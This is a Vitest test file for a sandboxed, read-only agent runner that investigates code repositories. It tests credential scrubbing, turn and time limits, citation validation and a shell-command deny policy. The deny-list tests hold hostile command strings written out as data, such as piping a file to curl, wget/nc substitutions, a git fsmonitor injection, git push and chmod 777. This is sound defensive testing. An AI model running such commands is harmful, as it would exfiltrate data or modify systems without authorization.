import { execFileSync } from "node:child_process";
import { existsSync, writeFileSync, readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { beforeAll, describe, expect, it } from "vitest";
import { makeFixture, makeInput, parseEvents, REPO, RUNNER_DIR, runCli, terminal, toolResults, CLARIFY, call, calls, runScripted, say, finalAnswer } from "./helpers.ts";
import { fauxAssistantMessage } from "@earendil-works/pi-ai";
import { apiKeyFor, takeCredentials } from "../src/runner/main.ts";
import { MAX_TURNS } from "../src/runner/run.ts";
import { rejectReason, splitCommands } from "../src/runner/tools.ts";
import { validateSubmission } from "../src/runner/submit.ts";

const SUBMIT = "submit_investigation";

beforeAll(() => {
  execFileSync(process.execPath, [fileURLToPath(new URL("../scripts/build-runner.mjs", import.meta.url))]);
}, 60_000);

describe("built runner (dist/runner.mjs)", { timeout: 30_000 }, () => {
  it("--faux investigates the checkout and submits a cited final_answer", () => {
    const fx = makeFixture();
    const { code, stdout, stderr } = runCli(["--faux"], JSON.stringify(makeInput(fx)));
    const events = parseEvents(stdout);

    expect(events[0]).toMatchObject({ type: "started", pi_version: "0.83.0", model: "faux" });
    expect(events[0]?.type === "started" && events[0].prompt_version).toMatch(/^[0-9a-f]{12}$/);
    expect(toolResults(events).map((r) => [r.tool, r.is_error])).toEqual([
      ["ls", false],
      ["bash", false],
      ["read", false],
      ["submit_investigation", false],
    ]);
    expect(toolResults(events)[1]?.output_preview).toContain(fx.commit);
    expect(events.some((e) => e.type === "usage")).toBe(true);

    const end = terminal(events);
    expect(end.type === "result" && end.result).toMatchObject({
      status: "final_answer",
      confidence: "low",
      evidence: [{ repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 12 }],
    });
    expect(code, stderr).toBe(0);
  });

  it("--faux asks for clarification when the latest human message says clarify, then answers the follow-up", () => {
    const fx = makeFixture();
    const first = makeInput(fx, { text: "Please clarify how retries work" });
    const turn1 = runCli(["--faux"], JSON.stringify(first));
    const end1 = terminal(parseEvents(turn1.stdout));
    expect(end1.type === "result" && end1.result.status).toBe("needs_clarification");
    expect(turn1.code).toBe(0);

    const question = end1.type === "result" && end1.result.status === "needs_clarification" ? end1.result.question : "";
    const second = {
      ...first,
      transcript: [
        ...first.transcript,
        { ts: "1727800001.000100", user_id: null, is_agent: true, text: question },
        { ts: "1727800002.000100", user_id: "U123", is_agent: false, text: "Web services in Oregon." },
      ],
    };
    const end2 = terminal(parseEvents(runCli(["--faux"], JSON.stringify(second)).stdout));
    expect(end2.type === "result" && end2.result.status).toBe("final_answer");
  });

  it("deletes the --key-file and never echoes the key", () => {
    const fx = makeFixture();
    const keyFile = join(fx.scratchDir, "anthropic.key");
    const key = "sk-ant-test-cli-0123456789abcdef";
    writeFileSync(keyFile, `${key}\n`);
    const { code, stdout, stderr } = runCli(["--faux", "--key-file", keyFile], JSON.stringify(makeInput(fx)));
    expect(code).toBe(0);
    expect(existsSync(keyFile)).toBe(false);
    expect(stdout + stderr).not.toContain(key);
  });

  it("rejects invalid input with invalid_input and exit 2", () => {
    const notJson = runCli(["--faux"], "{nope");
    expect(terminal(parseEvents(notJson.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
    expect(notJson.code).toBe(2);

    const fx = makeFixture();
    const badModel = runCli(["--faux"], JSON.stringify({ ...makeInput(fx), model: "claude-imaginary-9" }));
    expect(terminal(parseEvents(badModel.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
    expect(badModel.code).toBe(2);

    const missingField = runCli(["--faux"], JSON.stringify({ ...makeInput(fx), manifest: undefined }));
    expect(terminal(parseEvents(missingField.stdout))).toMatchObject({ type: "error", code: "invalid_input" });
  });

  it("fails with agent_error when no API key is available outside --faux", () => {
    const fx = makeFixture();
    const { code, stdout } = runCli([], JSON.stringify(makeInput(fx)));
    expect(terminal(parseEvents(stdout))).toMatchObject({ type: "error", code: "agent_error" });
    expect(code).toBe(1);
  });

  it("--self-test reports versions without input or network", () => {
    const { code, stdout } = runCli(["--self-test"], "");
    expect(JSON.parse(stdout)).toEqual({
      ok: true,
      pi_version: "0.83.0",
      prompt_version: expect.stringMatching(/^[0-9a-f]{12}$/),
      node: process.version,
    });
    expect(code).toBe(0);
  });

  it("writes dist/package.json with the externals pinned exactly", () => {
    const pkg = JSON.parse(execFileSync("cat", [fileURLToPath(new URL("../sandbox/dist/package.json", import.meta.url))], { encoding: "utf8" }));
    expect(pkg).toEqual({
      type: "module",
      private: true,
      dependencies: { "@earendil-works/pi-coding-agent": "0.83.0", "@earendil-works/pi-ai": "0.83.0", typebox: "1.3.7" },
    });
  });
});

describe("credentials", { timeout: 30_000 }, () => {
  it("deletes the key file before the session starts and keeps secrets out of the bash env", async () => {
    const fx = makeFixture();
    const keyFile = join(fx.scratchDir, "..", "anthropic.key");
    const fileKey = "sk-ant-test-FILEKEY-0123456789";
    writeFileSync(keyFile, `${fileKey}\n`);
    process.env.ANTHROPIC_API_KEY = "sk-ant-test-ENVKEY-9876543210";
    process.env.ANTHROPIC_OAUTH_TOKEN = "oauth-token-value";
    process.env.RENDER_API_KEY = "rnd-not-for-the-model";

    const { code, stdout, events } = await runScripted(
      makeInput(fx),
      () => [
        call("bash", { command: `test -e ${keyFile} && echo KEY_FILE_PRESENT || echo KEY_FILE_ABSENT; env` }),
        call(SUBMIT, CLARIFY),
      ],
      ["--key-file", keyFile],
    );

    const env = toolResults(events)[0]?.output_preview ?? "";
    expect(env).toContain("KEY_FILE_ABSENT");
    expect(env).toContain(`HOME=${fx.scratchDir}`);
    for (const leaked of ["sk-ant", "ANTHROPIC", "oauth-token-value", "RENDER_API_KEY"]) expect(env).not.toContain(leaked);
    expect(stdout).not.toContain(fileKey);
    expect(existsSync(keyFile)).toBe(false);
    expect(process.env.ANTHROPIC_API_KEY).toBeUndefined();
    expect(process.env.ANTHROPIC_OAUTH_TOKEN).toBeUndefined();
    expect(code).toBe(0);
    delete process.env.RENDER_API_KEY;
  });

  it("falls back to the selected provider's own key var and removes every provider's vars from the env", () => {
    const env: NodeJS.ProcessEnv = { ANTHROPIC_API_KEY: " sk-ant-env ", ANTHROPIC_AUTH_TOKEN: "bearer", OPENAI_API_KEY: "sk-openai", PATH: "/bin" };
    const creds = takeCredentials(undefined, env);
    expect(env).toEqual({ PATH: "/bin" });
    expect(apiKeyFor(creds, "anthropic")).toBe("sk-ant-env");
    expect(apiKeyFor(creds, "openai")).toBe("sk-openai");
    expect(apiKeyFor(creds, "google")).toBeUndefined();
  });
});

describe("run limits", { timeout: 30_000 }, () => {
  it("aborts at the deadline (timeout_ms minus the safety margin) with exit 3", async () => {
    const fx = makeFixture();
    const startedAt = Date.now();
    const { code, events } = await runScripted(makeInput(fx, { timeout_ms: 12_000 }), () =>
      Array.from({ length: 10 }, () => call("bash", { command: "sleep 5" })),
    );
    expect(terminal(events)).toMatchObject({ type: "error", code: "timeout" });
    expect(code).toBe(3);
    expect(Date.now() - startedAt).toBeLessThan(5_000);
    expect(toolResults(events)[0]).toMatchObject({ tool: "bash", is_error: true, output_preview: expect.stringContaining("aborted") });
  });

  it("ends on a submission batched with another call, without another LLM request", async () => {
    const fx = makeFixture();
    let extraCalls = 0;
    const { code, events } = await runScripted(makeInput(fx), () => [
      calls(["ls", {}], [SUBMIT, CLARIFY]),
      () => (extraCalls++, say("NEVER")),
    ]);
    expect(toolResults(events).map((r) => [r.tool, r.is_error])).toEqual([
      ["ls", false],
      [SUBMIT, false],
    ]);
    expect(terminal(events)).toMatchObject({ type: "result", result: CLARIFY });
    expect(extraCalls).toBe(0);
    expect(code).toBe(0);
  });

  it("reminds the model once when it stops without submitting", async () => {
    const fx = makeFixture();
    const answered = await runScripted(makeInput(fx), () => [say("Here is my answer in prose."), call(SUBMIT, CLARIFY)]);
    expect(terminal(answered.events)).toMatchObject({ type: "result" });
    expect(answered.events.filter((e) => e.type === "assistant_text").map((e) => e.type === "assistant_text" && e.text)).toEqual([
      "Here is my answer in prose.",
    ]);

    const silent = await runScripted(makeInput(fx), () => [say("prose"), say("more prose")]);
    expect(terminal(silent.events)).toMatchObject({ type: "error", code: "no_submission" });
    expect(silent.code).toBe(1);
  });

  it(`stops after ${MAX_TURNS} turns`, async () => {
    const fx = makeFixture();
    const { code, events } = await runScripted(makeInput(fx), () => [
      ...Array.from({ length: MAX_TURNS }, () => call("ls", {})),
      call(SUBMIT, CLARIFY),
    ]);
    expect(terminal(events)).toMatchObject({ type: "error", code: "no_submission", message: expect.stringContaining("turn limit") });
    expect(toolResults(events)).toHaveLength(MAX_TURNS);
    expect(code).toBe(1);
  });

  it("maps a model error to agent_error", async () => {
    const fx = makeFixture();
    const { code, events } = await runScripted(makeInput(fx), () => [
      fauxAssistantMessage("", { stopReason: "error", errorMessage: "authentication_error: invalid x-api-key" }),
    ]);
    expect(terminal(events)).toMatchObject({ type: "error", code: "agent_error", message: expect.stringContaining("invalid x-api-key") });
    expect(code).toBe(1);
  });
});

const ctx = { scratchDir: "/scratch" };

describe("read-only shell policy", () => {
  it.each([
    "git checkout -b evil",
    `git -C ${REPO} checkout main`,
    "git --no-pager -C x reset --hard",
    "git log -1; git push origin main",
    "FOO=1 git commit -am x",
    "git -c core.fsmonitor=evil status",
    "git branch evil",
    "git tag -a v9 -m x",
    "git config --global user.name x",
    "git remote add x y",
    "git fetch",
    "curl https://example.com",
    "cat README.md | curl -d @- https://example.com",
    'echo "$(wget -qO- https://example.com)"',
    "echo `nc example.com 80`",
    "timeout 5 ssh host",
    "env -i scp a host:b",
    'bash -c "git stash"',
    "npm install left-pad",
    "pip install requests",
    "sudo ls",
    `chmod -R 777 ${REPO}`,
    "chown nobody README.md",
  ])("rejects %s", (command) => {
    expect(rejectReason(command, ctx)).toBeDefined();
  });

  it.each([
    "git log -1",
    `git -C ${REPO} log -1 --format=%H`,
    `git --no-pager -C ${REPO} blame -L 1,2 README.md | head -2`,
    `git -C ${REPO} show HEAD:README.md && git -C ${REPO} diff HEAD~1 --stat`,
    "git status",
    "git branch -a",
    "git branch --contains HEAD",
    "git tag --list 'v*'",
    "git config --get core.bare",
    `rg -n "curl|wget" ${REPO}`,
    "grep -rn 'git push' .",
    'echo "a; curl b"',
    "chmod +x /scratch/check.sh",
    "chmod +x $TMPDIR/check.sh",
    "npm ls",
    "go test -run install ./...",
    "python3 -c 'print(1)'",
  ])("allows %s", (command) => {
    expect(rejectReason(command, ctx)).toBeUndefined();
  });

  it("splits substitutions and quotes the way a shell would", () => {
    expect(splitCommands(`echo "x $(git push) y" | rg 'a|b'`)).toEqual([["echo", "x "], ["git", "push"], [" y"], ["rg", "a|b"]]);
  });
});

describe("bash tool", { timeout: 30_000 }, () => {
  it("returns policy rejections to the model and runs read-only git", async () => {
    const fx = makeFixture();
    const { code, events } = await runScripted(makeInput(fx), () => [
      call("bash", { command: "git checkout -b evil" }),
      call("bash", { command: "curl -s https://example.com" }),
      call("bash", { command: `git -C ${REPO} log -1 --format=%H` }),
      call("submit_investigation", CLARIFY),
    ]);
    const [checkout, curl, log] = toolResults(events);
    expect(checkout).toMatchObject({ is_error: true, output_preview: expect.stringContaining("git checkout is not allowed") });
    expect(curl).toMatchObject({ is_error: true, output_preview: expect.stringContaining("curl is not allowed") });
    expect(log).toMatchObject({ is_error: false });
    expect(log?.output_preview.trim()).toBe(fx.commit);
    expect(terminal(events).type).toBe("result");
    expect(code).toBe(0);
  });

  it("points the model at bash when rg/fd are unavailable", async () => {
    const fx = makeFixture();
    const { events } = await runScripted(makeInput(fx), () => [
      call("find", { pattern: "*.md", path: REPO }),
      call("submit_investigation", CLARIFY),
    ]);
    const [find] = toolResults(events);
    if (find?.is_error) expect(find.output_preview).toContain("Use the bash tool instead");
    else expect(find?.output_preview).toContain("README.md");
  });
});

describe("validateSubmission", () => {
  const fx = makeFixture();
  const checkouts = { manifest: makeInput(fx).manifest, repos_root: fx.reposRoot };
  const cite = (over: Record<string, unknown>) => finalAnswer([{ repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 3, ...over }]);
  const problems = (candidate: unknown) => {
    const v = validateSubmission(candidate, checkouts);
    return v.ok ? [] : v.problems;
  };

  it("accepts a clarification and a valid citation, normalizing commit prefixes and ./ paths", () => {
    expect(validateSubmission(CLARIFY, checkouts).ok).toBe(true);
    const v = validateSubmission(cite({ commit: fx.commit.slice(0, 7), path: "./src/retry.ts", end_line: 2 }), checkouts);
    expect(v.ok && v.result.status === "final_answer" && v.result.evidence[0]).toEqual({
      repository: REPO,
      commit: fx.commit,
      path: "src/retry.ts",
      start_line: 1,
      end_line: 2,
    });
  });

  it("reports schema problems field by field", () => {
    expect(problems({ status: "final_answer", answer: "x" }).join("\n")).toMatch(/confidence/);
    expect(problems({ status: "needs_clarification" }).join("\n")).toMatch(/question[\s\S]*why_needed/);
  });

  it("rejects citations that do not match the manifest or the checkout", () => {
    expect(problems(cite({ repository: "acme/other" }))).toEqual([expect.stringMatching(/not in the manifest \(acme\/widget\)/)]);
    expect(problems(cite({ commit: "deadbeef" }))).toEqual([expect.stringContaining(`not the manifest commit for ${REPO} (${fx.commit})`)]);
    expect(problems(cite({ path: "../../outside.txt" }))).toEqual([expect.stringContaining('must not contain ".."')]);
    expect(problems(cite({ path: "escape.txt" }))).toEqual([expect.stringContaining("resolves outside acme/widget")]);
    expect(problems(cite({ path: `${fx.repoDir}/README.md` }))).toEqual([expect.stringContaining('did you mean "README.md"')]);
    expect(problems(cite({ path: `${REPO}/README.md` }))).toEqual([expect.stringContaining('try "README.md"')]);
    expect(problems(cite({ path: "src" }))).toEqual([expect.stringContaining("not a regular file")]);
    expect(problems(cite({ path: ".git/HEAD" }))).toEqual([expect.stringContaining("inside .git")]);
    expect(problems(cite({ end_line: 13 }))).toEqual([expect.stringContaining("past the end of acme/widget/README.md (12 lines)")]);
    expect(problems(cite({ start_line: 5, end_line: 4 }))).toEqual([expect.stringContaining("start_line 5 is after end_line 4")]);
  });

  it("requires evidence when observed_in_code has claims", () => {
    expect(problems(finalAnswer([]))).toEqual([expect.stringContaining("observed_in_code has 1 claim(s) but evidence is empty")]);
    expect(problems(finalAnswer([], []))).toEqual([]);
  });

  it("drops a model-supplied url from the returned evidence", () => {
    const candidate = finalAnswer([
      { repository: REPO, commit: fx.commit, path: "README.md", start_line: 1, end_line: 3, url: "https://evil.example.com" },
    ]);
    const v = validateSubmission(candidate, checkouts);
    expect(v.ok).toBe(true);
    if (v.ok && v.result.status === "final_answer") {
      expect(v.result.evidence[0]).not.toHaveProperty("url");
    }
  });
});

describe("submit_investigation in a run", { timeout: 30_000 }, () => {
  it("returns every problem to the model, and accepts the corrected submission", async () => {
    const fx = makeFixture();
    const bad = finalAnswer([
      { repository: REPO, commit: "deadbeef", path: "src/retry.ts", start_line: 1, end_line: 2 },
      { repository: REPO, commit: fx.commit, path: "../../outside.txt", start_line: 1, end_line: 1 },
      { repository: REPO, commit: fx.commit, path: "README.md", start_line: 10, end_line: 99 },
    ]);
    const good = finalAnswer([{ repository: REPO, commit: fx.commit.slice(0, 10), path: "src/retry.ts", start_line: 1, end_line: 2 }]);
    let extraCalls = 0;
    const { code, events } = await runScripted(makeInput(fx), () => [
      call(SUBMIT, bad),
      call(SUBMIT, finalAnswer([])),
      call(SUBMIT, good),
      () => (extraCalls++, say("NEVER")),
    ]);

    const [first, second, third] = toolResults(events);
    expect(first).toMatchObject({ tool: SUBMIT, is_error: true });
    expect(first?.output_preview).toContain("attempt 1 of 3");
    expect(first?.output_preview).toContain("evidence[0].commit");
    expect(first?.output_preview).toContain("evidence[1].path");
    expect(first?.output_preview).toContain("evidence[2].end_line");
    expect(second).toMatchObject({ is_error: true, output_preview: expect.stringContaining("evidence is empty") });
    expect(third).toMatchObject({ is_error: false });

    const end = terminal(events);
    expect(end.type === "result" && end.result).toMatchObject({
      status: "final_answer",
      evidence: [{ repository: REPO, commit: fx.commit, path: "src/retry.ts", start_line: 1, end_line: 2 }],
    });
    expect(code).toBe(0);
    expect(extraCalls).toBe(0);
  });

  it("gives up with invalid_submission after three rejected submissions", async () => {
    const fx = makeFixture();
    const bad = finalAnswer([{ repository: REPO, commit: fx.commit, path: "missing.ts", start_line: 1, end_line: 1 }]);
    let extraCalls = 0;
    const { code, events } = await runScripted(makeInput(fx), () => [
      call(SUBMIT, bad),
      call(SUBMIT, bad),
      call(SUBMIT, bad),
      () => (extraCalls++, call(SUBMIT, CLARIFY)),
    ]);
    expect(toolResults(events).every((r) => r.is_error)).toBe(true);
    expect(toolResults(events).at(-1)?.output_preview).toContain("No attempts remain");
    expect(terminal(events)).toMatchObject({ type: "error", code: "invalid_submission" });
    expect(code).toBe(1);
    expect(extraCalls).toBe(0);
  });
});

const ALLOWED_EXTERNAL = new Set([
  "@earendil-works/pi-coding-agent",
  "@earendil-works/pi-ai",
  "typebox",
]);

function extractImports(code: string): string[] {
  const imports: string[] = [];
  for (const match of code.matchAll(/from\s+["']([^"']+)["']/g)) {
    imports.push(match[1]!);
  }
  return imports;
}

describe("runner import boundary", () => {
  it("files under src/runner/ import only from src/runner/*, src/types.ts, Node built-ins, or pinned externals", () => {
    const files = readdirSync(RUNNER_DIR).filter(f => f.endsWith(".ts") && !f.endsWith(".d.ts"));
    const violations: string[] = [];

    for (const file of files) {
      const code = readFileSync(join(RUNNER_DIR, file), "utf8");
      for (const spec of extractImports(code)) {
        // Allow Node built-ins
        if (spec.startsWith("node:")) continue;
        // Allow relative runner imports
        if (spec.startsWith("./") || spec.startsWith("../")) {
          // Must be within runner/ or src/types.ts
          if (spec.startsWith("./")) continue; // same directory
          if (spec === "../types.ts") continue;
          // Allow ?raw imports from outside (prompt.md, core-prompt.md)
          if (spec.endsWith("?raw")) continue;
          violations.push(`${file}: imports "${spec}" (outside runner/ and not src/types.ts)`);
          continue;
        }
        // Allow pinned externals
        const pkg = spec.startsWith("@") ? spec.split("/").slice(0, 2).join("/") : spec.split("/")[0]!;
        if (ALLOWED_EXTERNAL.has(pkg)) continue;
        violations.push(`${file}: imports "${spec}" (not a pinned external or Node built-in)`);
      }
    }

    expect(violations).toEqual([]);
  });
});
